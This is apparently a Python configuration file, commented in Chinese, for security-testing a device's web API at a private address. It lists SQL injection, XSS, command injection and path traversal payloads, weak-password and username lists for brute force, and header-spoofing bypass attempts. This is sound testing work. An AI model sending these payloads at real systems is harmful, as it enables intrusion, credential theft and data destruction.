#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
安全测试配置文件

定义安全测试的各种配置参数和规则
"""

# 安全测试配置
SECURITY_CONFIG = {
    # 测试目标配置
    'target': {
        'base_url': 'http://192.168.2.119',
        'timeout': 10,
        'retry_count': 3,
        'delay_between_requests': 0.1
    },
    
    # 认证配置
    'authentication': {
        'test_users': {
            'admin': {'username': 'admin', 'password': 'admin123'},
            'user': {'username': 'user', 'password': 'user123'},
            'guest': {'username': 'guest', 'password': 'guest123'},
            'operator': {'username': 'operator', 'password': 'operator123'}
        },
        'login_endpoints': [
            '/api/v1/auth/login',
            '/api/v1/user/login',
            '/api/v1/login',
            '/login'
        ]
    },
    
    # 测试接口配置
    'endpoints': {
        'public': [
            '/api/v1/public/info',
            '/api/v1/public/status',
            '/api/v1/health'
        ],
        'user': [
            '/api/v1/user/profile',
            '/api/v1/user/data',
            '/api/v1/user/settings'
        ],
        'admin': [
            '/api/v1/admin/users',
            '/api/v1/admin/system',
            '/api/v1/admin/config',
            '/api/v1/admin/logs',
            '/api/v1/admin/backup',
            '/api/v1/admin/restore',
            '/api/v1/admin/delete',
            '/api/v1/admin/reboot'
        ],
        'sensitive': [
            '/api/v1/auth/login',
            '/api/v1/user/register',
            '/api/v1/face/upload',
            '/api/v1/data/upload',
            '/api/v1/file/upload'
        ]
    },
    
    # 安全头配置
    'security_headers': {
        'required': [
            'Strict-Transport-Security',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Content-Security-Policy',
            'Referrer-Policy'
        ],
        'optional': [
            'X-Permitted-Cross-Domain-Policies',
            'X-Download-Options',
            'X-DNS-Prefetch-Control'
        ]
    },
    
    # 敏感数据模式
    'sensitive_patterns': {
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'phone': r'(\+?86)?1[3-9]\d{9}|\d{3,4}-\d{7,8}',
        'id_card': r'\d{17}[\dXx]|\d{15}',
        'credit_card': r'\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}',
        'password': r'password["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?',
        'token': r'token["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=]+["\']?',
        'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=]+["\']?',
        'secret': r'secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=]+["\']?',
        'ip_address': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
        'mac_address': r'\b([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})\b'
    },
    
    # 攻击载荷配置
    'payloads': {
        'sql_injection': [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "' OR '1'='1' AND '1'='1",
            "1' OR '1'='1",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "') OR ('1'='1"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ],
        'command_injection': [
            "; ls -la",
            "| whoami",
            "& dir",
            "` id `",
            "$(id)",
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "` cat /etc/passwd `",
            "$(cat /etc/passwd)",
            "; uname -a"
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
    },
    
    # 弱密码配置
    'weak_passwords': [
        '123456', 'password', 'admin', 'root', '12345678',
        'qwerty', 'abc123', 'password123', 'admin123',
        '1234567890', 'letmein', 'welcome', 'monkey',
        '123456789', 'qwertyuiop', '1234567890',
        'password1', '123123', 'admin123456'
    ],
    
    # 常见用户名配置
    'common_usernames': [
        'admin', 'root', 'user', 'test', 'guest', 'demo',
        'administrator', 'operator', 'camera', 'device',
        'system', 'service', 'api', 'web', 'app'
    ],
    
    # 端口扫描配置
    'port_scan': {
        'common_ports': [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443],
        'dangerous_ports': [21, 23, 135, 139, 445, 1433, 3306, 3389, 5432, 5900, 6379]
    },
    
    # SSL/TLS配置
    'ssl_tls': {
        'weak_versions': ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1'],
        'weak_ciphers': ['RC4', 'DES', '3DES', 'MD5', 'SHA1'],
        'min_key_length': 128,
        'recommended_versions': ['TLSv1.2', 'TLSv1.3']
    },
    
    # 权限配置
    'permissions': {
        'roles': {
            'guest': {
                'level': 0,
                'allowed': ['/api/v1/public/info', '/api/v1/public/status'],
                'denied': ['/api/v1/user/profile', '/api/v1/admin/users']
            },
            'user': {
                'level': 1,
                'allowed': ['/api/v1/user/profile', '/api/v1/user/data'],
                'denied': ['/api/v1/admin/users', '/api/v1/admin/config']
            },
            'operator': {
                'level': 2,
                'allowed': ['/api/v1/camera/control', '/api/v1/settings/basic'],
                'denied': ['/api/v1/admin/users', '/api/v1/admin/delete']
            },
            'admin': {
                'level': 3,
                'allowed': ['/api/v1/admin/users', '/api/v1/admin/config'],
                'denied': []
            }
        }
    },
    
    # 报告配置
    'reporting': {
        'severity_levels': ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
        'output_formats': ['txt', 'json', 'html'],
        'include_raw_data': True,
        'max_violations_per_test': 100
    },
    
    # 测试限制配置
    'limits': {
        'max_requests_per_second': 10,
        'max_concurrent_requests': 5,
        'request_timeout': 10,
        'max_retry_attempts': 3,
        'delay_between_tests': 0.1
    }
}

# 安全测试规则
SECURITY_RULES = {
    'authentication': {
        'bypass_attempts': [
            {'headers': {}},
            {'headers': {'Authorization': ''}},
            {'headers': {'Authorization': 'Bearer invalid_token'}},
            {'headers': {'Authorization': 'Basic invalid'}},
            {'headers': {'X-Forwarded-For': '127.0.0.1'}},
            {'headers': {'X-Real-IP': '127.0.0.1'}},
            {'headers': {'X-Originating-IP': '127.0.0.1'}}
        ]
    },
    
    'injection_tests': {
        'sql_error_patterns': [
            r'mysql_fetch_array',
            r'ORA-\d+',
            r'Microsoft.*ODBC.*SQL Server',
            r'SQLServer JDBC Driver',
            r'PostgreSQL.*ERROR',
            r'Warning.*mysql_',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'SQL syntax.*MySQL',
            r'Warning.*pg_',
            r'valid PostgreSQL result'
        ],
        'command_result_patterns': [
            'uid=', 'gid=', 'groups=',
            'root:', 'bin:', 'daemon:',
            'total ', 'drwx', '-rw-',
            'Microsoft Windows', 'Volume in drive'
        ],
        'system_file_patterns': [
            'root:', 'bin:', 'daemon:',
            '127.0.0.1', 'localhost',
            'Microsoft Windows', 'Volume in drive'
        ]
    },
    
    'brute_force': {
        'max_attempts': 20,
        'lockout_codes': [429, 423, 503],
        'delay_between_attempts': 0.1
    }
}

# 安全测试分类
SECURITY_CATEGORIES = {
    'authentication': {
        'name': '认证安全',
        'description': '测试认证机制的安全性',
        'tests': ['bypass', 'weak_password', 'brute_force', 'session_management']
    },
    'authorization': {
        'name': '授权安全',
        'description': '测试访问控制机制',
        'tests': ['privilege_escalation', 'horizontal_bypass', 'vertical_bypass', 'role_validation']
    },
    'injection': {
        'name': '注入攻击',
        'description': '测试各种注入漏洞',
        'tests': ['sql_injection', 'xss', 'command_injection', 'path_traversal']
    },
    'crypto': {
        'name': '加密安全',
        'description': '测试加密实现的安全性',
        'tests': ['ssl_tls', 'data_encryption', 'key_management', 'password_hashing']
    },
    'privacy': {
        'name': '隐私保护',
        'description': '测试数据隐私保护',
        'tests': ['data_leakage', 'pii_protection', 'data_minimization', 'anonymization']
    },
    'network': {
        'name': '网络安全',
        'description': '测试网络安全配置',
        'tests': ['port_scan', 'security_headers', 'ssl_config', 'protocol_security']
    }
}

# 安全测试优先级
SECURITY_PRIORITIES = {
    'CRITICAL': {
        'color': 'red',
        'description': '严重安全漏洞，需要立即修复',
        'examples': ['认证绕过', 'SQL注入', '权限提升', '命令执行']
    },
    'HIGH': {
        'color': 'orange',
        'description': '高危安全漏洞，需要优先修复',
        'examples': ['XSS', 'CSRF', '敏感数据泄露', '弱加密']
    },
    'MEDIUM': {
        'color': 'yellow',
        'description': '中危安全漏洞，建议修复',
        'examples': ['安全头缺失', '信息泄露', '弱密码策略']
    },
    'LOW': {
        'color': 'blue',
        'description': '低危安全问题，可选择性修复',
        'examples': ['版本信息泄露', '配置不当', '日志记录不足']
    }
}


